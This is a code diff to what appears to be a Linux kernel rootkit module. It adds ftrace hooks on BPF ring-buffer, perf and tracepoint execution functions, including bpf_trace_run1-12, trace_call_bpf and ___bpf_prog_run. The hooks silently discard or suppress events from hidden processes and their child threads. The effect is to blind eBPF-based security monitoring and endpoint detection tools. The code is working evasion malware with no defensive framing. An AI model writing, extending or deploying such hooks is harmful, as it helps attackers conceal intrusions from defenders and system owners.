@@ -154,7 +154,8 @@ static notrace inline bool should_hide_child_pid_by_int(int pid)
 
 static notrace inline bool should_hide_any_pid_by_int(int pid)
 {
-    return should_hide_pid_by_int(pid) || should_hide_child_pid_by_int(pid);
+    return should_hide_pid_by_int(pid) || should_hide_child_pid_by_int(pid) ||
+           pid_is_thread(pid);
 }
 
 static notrace inline bool should_hide_pid_fast_nmi(int pid)
@@ -329,26 +330,6 @@ static notrace inline bool is_valid_task_ptr_safe(const struct task_struct *task
     return true;
 }
 
-static notrace inline bool should_filter_bpf_prog_exec(const struct bpf_prog *prog)
-{
-    enum bpf_prog_type type;
-
-    if (!prog)
-        return false;
-
-    type = READ_ONCE(prog->type);
-
-    switch (type) {
-    case BPF_PROG_TYPE_TRACEPOINT:
-    case BPF_PROG_TYPE_RAW_TRACEPOINT:
-    case BPF_PROG_TYPE_RAW_TRACEPOINT_WRITABLE:
-    case BPF_PROG_TYPE_TRACING:
-    case BPF_PROG_TYPE_PERF_EVENT:
-        return true;
-    default:
-        return false;
-    }
-}
 
 static notrace bool mem_has_substr(const char *buf, u32 len, const char *needle)
 {
@@ -437,6 +418,9 @@ static notrace bool should_suppress_mon_event(const void *data, u64 size)
 
 typedef void (*t_rb_discard)(void *, u64);
 static t_rb_discard fn_rb_discard = NULL;
+
+typedef void (*t_rb_discard_dynptr)(void *, u64);
+static t_rb_discard_dynptr fn_rb_discard_dynptr = NULL;
 
 static notrace inline void safe_discard(void *data, u64 flags)
 {
@@ -644,6 +628,62 @@ passthrough:
     return orig_bpf_ringbuf_output(ringbuf, data, size, flags);
 }
 
+static int (*orig_bpf_ringbuf_reserve_dynptr)(void *ringbuf, u32 size, u64 flags, void *ptr) = NULL;
+
+static notrace int hook_bpf_ringbuf_reserve_dynptr(void *ringbuf, u32 size, u64 flags, void *ptr)
+{
+    pid_t tgid, pid;
+
+    if (!orig_bpf_ringbuf_reserve_dynptr) return -ENOSYS;
+
+    tgid = READ_ONCE(current->tgid);
+    pid  = READ_ONCE(current->pid);
+
+    if (in_nmi()) {
+        if (should_hide_pid_fast_nmi((int)tgid) ||
+            should_hide_pid_fast_nmi((int)pid))
+            return -ENOSPC;
+        return orig_bpf_ringbuf_reserve_dynptr(ringbuf, size, flags, ptr);
+    }
+
+    if (is_child_of_hidden_process((int)tgid) ||
+        is_child_of_hidden_process((int)pid))
+        return -ENOSPC;
+
+    return orig_bpf_ringbuf_reserve_dynptr(ringbuf, size, flags, ptr);
+}
+
+static void (*orig_bpf_ringbuf_submit_dynptr)(void *ptr, u64 flags) = NULL;
+
+static notrace void hook_bpf_ringbuf_submit_dynptr(void *ptr, u64 flags)
+{
+    pid_t tgid, pid;
+
+    if (!orig_bpf_ringbuf_submit_dynptr) return;
+    if (!ptr || (unsigned long)ptr < PAGE_SIZE) goto passthrough;
+
+    tgid = READ_ONCE(current->tgid);
+    pid  = READ_ONCE(current->pid);
+
+    if (in_nmi()) {
+        if (should_hide_pid_fast_nmi((int)tgid) ||
+            should_hide_pid_fast_nmi((int)pid)) {
+            if (fn_rb_discard_dynptr) fn_rb_discard_dynptr(ptr, flags);
+            return;
+        }
+        goto passthrough;
+    }
+
+    if (is_child_of_hidden_process((int)tgid) ||
+        is_child_of_hidden_process((int)pid)) {
+        if (fn_rb_discard_dynptr) fn_rb_discard_dynptr(ptr, flags);
+        return;
+    }
+
+passthrough:
+    orig_bpf_ringbuf_submit_dynptr(ptr, flags);
+}
+
 static int (*orig_perf_event_output)(struct perf_event *event,
                                       struct perf_sample_data *data,
                                       struct pt_regs *regs) = NULL;
@@ -693,16 +733,22 @@ static notrace int hook_perf_event_output(struct perf_event *event,
 }
 
 static void (*orig_perf_trace_run_bpf_submit)(void *raw_data, int size,
-                                               int rctx, struct pt_regs *regs,
+                                               int rctx, void *call, u64 count,
+                                               struct pt_regs *regs,
                                                struct hlist_head *head,
                                                struct task_struct *task) = NULL;
 
 static notrace void hook_perf_trace_run_bpf_submit(void *raw_data, int size,
-                                                    int rctx, struct pt_regs *regs,
+                                                    int rctx, void *call, u64 count,
+                                                    struct pt_regs *regs,
                                                     struct hlist_head *head,
                                                     struct task_struct *task)
 {
     if (!orig_perf_trace_run_bpf_submit) return;
+
+    if (is_child_of_hidden_process((int)READ_ONCE(current->tgid)) ||
+        is_child_of_hidden_process((int)READ_ONCE(current->pid)))
+        return;
 
     if (task) {
         pid_t t_pid  = READ_ONCE(task->pid);
@@ -711,10 +757,6 @@ static notrace void hook_perf_trace_run_bpf_submit(void *raw_data, int size,
             is_child_of_hidden_process((int)t_tgid))
             return;
     }
-
-    if (is_child_of_hidden_process((int)READ_ONCE(current->tgid)) ||
-        is_child_of_hidden_process((int)READ_ONCE(current->pid)))
-        return;
 
     if (raw_data && size > (int)sizeof(u32)) {
         const void *inner = (const u8 *)raw_data + sizeof(u32);
@@ -732,20 +774,9 @@ static notrace void hook_perf_trace_run_bpf_submit(void *raw_data, int size,
         }
     }
 
-    orig_perf_trace_run_bpf_submit(raw_data, size, rctx, regs, head, task);
+    orig_perf_trace_run_bpf_submit(raw_data, size, rctx, call, count, regs, head, task);
 }
 
-static u32 (*orig_bpf_prog_run)(const struct bpf_prog *prog, const void *ctx) = NULL;
-
-static notrace u32 hook_bpf_prog_run(const struct bpf_prog *prog, const void *ctx)
-{
-    if (!orig_bpf_prog_run) return 0;
-    if (should_filter_bpf_prog_exec(prog) &&
-        (is_child_of_hidden_process((int)READ_ONCE(current->tgid)) ||
-         is_child_of_hidden_process((int)READ_ONCE(current->pid))))
-        return 0;
-    return orig_bpf_prog_run(prog, ctx);
-}
 
 static int (*orig_bpf_iter_run_prog)(struct bpf_prog *prog, void *ctx) = NULL;
 
@@ -821,6 +852,59 @@ passthrough:
     return orig_bpf_seq_printf(m, fmt, fmt_size, data, data_len);
 }
 
+static unsigned int (*orig_trace_call_bpf)(void *call, void *ctx) = NULL;
+
+static notrace unsigned int hook_trace_call_bpf(void *call, void *ctx)
+{
+    if (!orig_trace_call_bpf) return 1;
+    if (!in_nmi()) {
+        if (is_child_of_hidden_process((int)READ_ONCE(current->tgid)) ||
+            is_child_of_hidden_process((int)READ_ONCE(current->pid)))
+            return 0;
+    }
+    return orig_trace_call_bpf(call, ctx);
+}
+
+#define DEFINE_BPF_TRACE_HOOK(N, PARAMS, ARGS)                          \
+static void (*orig_bpf_trace_run##N) PARAMS = NULL;                     \
+static notrace void hook_bpf_trace_run##N PARAMS                        \
+{                                                                        \
+    if (!orig_bpf_trace_run##N) return;                                 \
+    if (!in_nmi()) {                                                     \
+        if (is_child_of_hidden_process((int)READ_ONCE(current->tgid)) ||\
+            is_child_of_hidden_process((int)READ_ONCE(current->pid)))    \
+            return;                                                      \
+    }                                                                    \
+    orig_bpf_trace_run##N ARGS;                                         \
+}
+
+DEFINE_BPF_TRACE_HOOK(1,  (void *l, u64 a1), (l, a1))
+DEFINE_BPF_TRACE_HOOK(2,  (void *l, u64 a1, u64 a2), (l, a1, a2))
+DEFINE_BPF_TRACE_HOOK(3,  (void *l, u64 a1, u64 a2, u64 a3), (l, a1, a2, a3))
+DEFINE_BPF_TRACE_HOOK(4,  (void *l, u64 a1, u64 a2, u64 a3, u64 a4), (l, a1, a2, a3, a4))
+DEFINE_BPF_TRACE_HOOK(5,  (void *l, u64 a1, u64 a2, u64 a3, u64 a4, u64 a5), (l, a1, a2, a3, a4, a5))
+DEFINE_BPF_TRACE_HOOK(6,  (void *l, u64 a1, u64 a2, u64 a3, u64 a4, u64 a5, u64 a6), (l, a1, a2, a3, a4, a5, a6))
+DEFINE_BPF_TRACE_HOOK(7,  (void *l, u64 a1, u64 a2, u64 a3, u64 a4, u64 a5, u64 a6, u64 a7), (l, a1, a2, a3, a4, a5, a6, a7))
+DEFINE_BPF_TRACE_HOOK(8,  (void *l, u64 a1, u64 a2, u64 a3, u64 a4, u64 a5, u64 a6, u64 a7, u64 a8), (l, a1, a2, a3, a4, a5, a6, a7, a8))
+DEFINE_BPF_TRACE_HOOK(9,  (void *l, u64 a1, u64 a2, u64 a3, u64 a4, u64 a5, u64 a6, u64 a7, u64 a8, u64 a9), (l, a1, a2, a3, a4, a5, a6, a7, a8, a9))
+DEFINE_BPF_TRACE_HOOK(10, (void *l, u64 a1, u64 a2, u64 a3, u64 a4, u64 a5, u64 a6, u64 a7, u64 a8, u64 a9, u64 a10), (l, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10))
+DEFINE_BPF_TRACE_HOOK(11, (void *l, u64 a1, u64 a2, u64 a3, u64 a4, u64 a5, u64 a6, u64 a7, u64 a8, u64 a9, u64 a10, u64 a11), (l, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11))
+DEFINE_BPF_TRACE_HOOK(12, (void *l, u64 a1, u64 a2, u64 a3, u64 a4, u64 a5, u64 a6, u64 a7, u64 a8, u64 a9, u64 a10, u64 a11, u64 a12), (l, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12))
+
+typedef u32 (*t_bpf_prog_run_fn)(u64 *regs, const struct bpf_insn *insn);
+static t_bpf_prog_run_fn orig_bpf_prog_run_fn = NULL;
+
+static notrace u32 hook_bpf_prog_run_fn(u64 *regs, const struct bpf_insn *insn)
+{
+    if (!orig_bpf_prog_run_fn) return 0;
+    if (!in_nmi()) {
+        if (is_child_of_hidden_process((int)READ_ONCE(current->tgid)) ||
+            is_child_of_hidden_process((int)READ_ONCE(current->pid)))
+            return 0;
+    }
+    return orig_bpf_prog_run_fn(regs, insn);
+}
+
 static asmlinkage long (*orig_bpf)(const struct pt_regs *);
 static asmlinkage long (*orig_bpf_ia32)(const struct pt_regs *);
 
@@ -840,10 +924,11 @@ static struct ftrace_hook hooks[] = {
     HOOK("bpf_map_lookup_elem",       hook_bpf_map_lookup_elem,       &orig_bpf_map_lookup_elem),
     HOOK("bpf_map_update_elem",       hook_bpf_map_update_elem,       &orig_bpf_map_update_elem),
     HOOK("array_map_update_elem",     hook_array_map_update_elem,     &orig_array_map_update_elem),
-    HOOK("bpf_ringbuf_output",        hook_bpf_ringbuf_output,        &orig_bpf_ringbuf_output),
-    HOOK("bpf_ringbuf_reserve",       hook_bpf_ringbuf_reserve,       &orig_bpf_ringbuf_reserve),
-    HOOK("bpf_ringbuf_submit",        hook_bpf_ringbuf_submit,        &orig_bpf_ringbuf_submit),
-    HOOK("__bpf_prog_run",            hook_bpf_prog_run,              &orig_bpf_prog_run),
+    HOOK("bpf_ringbuf_output",           hook_bpf_ringbuf_output,           &orig_bpf_ringbuf_output),
+    HOOK("bpf_ringbuf_reserve",          hook_bpf_ringbuf_reserve,          &orig_bpf_ringbuf_reserve),
+    HOOK("bpf_ringbuf_submit",           hook_bpf_ringbuf_submit,           &orig_bpf_ringbuf_submit),
+    HOOK("bpf_ringbuf_reserve_dynptr",   hook_bpf_ringbuf_reserve_dynptr,   &orig_bpf_ringbuf_reserve_dynptr),
+    HOOK("bpf_ringbuf_submit_dynptr",    hook_bpf_ringbuf_submit_dynptr,    &orig_bpf_ringbuf_submit_dynptr),
     HOOK("perf_event_output",         hook_perf_event_output,         &orig_perf_event_output),
     HOOK("perf_trace_run_bpf_submit", hook_perf_trace_run_bpf_submit, &orig_perf_trace_run_bpf_submit),
     HOOK("bpf_iter_run_prog",         hook_bpf_iter_run_prog,         &orig_bpf_iter_run_prog),
@@ -851,6 +936,20 @@ static struct ftrace_hook hooks[] = {
     HOOK("bpf_seq_printf",            hook_bpf_seq_printf,            &orig_bpf_seq_printf),
     HOOK("__x64_sys_bpf",             hook_bpf,                       &orig_bpf),
     HOOK("__ia32_sys_bpf",            hook_bpf_ia32,                  &orig_bpf_ia32),
+    HOOK("trace_call_bpf",            hook_trace_call_bpf,            &orig_trace_call_bpf),
+    HOOK("bpf_trace_run1",            hook_bpf_trace_run1,            &orig_bpf_trace_run1),
+    HOOK("bpf_trace_run2",            hook_bpf_trace_run2,            &orig_bpf_trace_run2),
+    HOOK("bpf_trace_run3",            hook_bpf_trace_run3,            &orig_bpf_trace_run3),
+    HOOK("bpf_trace_run4",            hook_bpf_trace_run4,            &orig_bpf_trace_run4),
+    HOOK("bpf_trace_run5",            hook_bpf_trace_run5,            &orig_bpf_trace_run5),
+    HOOK("bpf_trace_run6",            hook_bpf_trace_run6,            &orig_bpf_trace_run6),
+    HOOK("bpf_trace_run7",            hook_bpf_trace_run7,            &orig_bpf_trace_run7),
+    HOOK("bpf_trace_run8",            hook_bpf_trace_run8,            &orig_bpf_trace_run8),
+    HOOK("bpf_trace_run9",            hook_bpf_trace_run9,            &orig_bpf_trace_run9),
+    HOOK("bpf_trace_run10",           hook_bpf_trace_run10,           &orig_bpf_trace_run10),
+    HOOK("bpf_trace_run11",           hook_bpf_trace_run11,           &orig_bpf_trace_run11),
+    HOOK("bpf_trace_run12",           hook_bpf_trace_run12,           &orig_bpf_trace_run12),
+    HOOK("___bpf_prog_run",           hook_bpf_prog_run_fn,           &orig_bpf_prog_run_fn),
 };
 
 notrace int bpf_hook_init(void)
@@ -862,7 +961,8 @@ notrace int bpf_hook_init(void)
 
     fn_map_next   = (t_map_next)  resolve_sym("bpf_map_get_curr_or_next");
     fn_map_put    = (t_map_put)   resolve_sym("bpf_map_put");
-    fn_rb_discard = (t_rb_discard)resolve_sym("bpf_ringbuf_discard");
+    fn_rb_discard        = (t_rb_discard)        resolve_sym("bpf_ringbuf_discard");
+    fn_rb_discard_dynptr = (t_rb_discard_dynptr) resolve_sym("bpf_ringbuf_discard_dynptr");
 
     find_config_map_va();
 
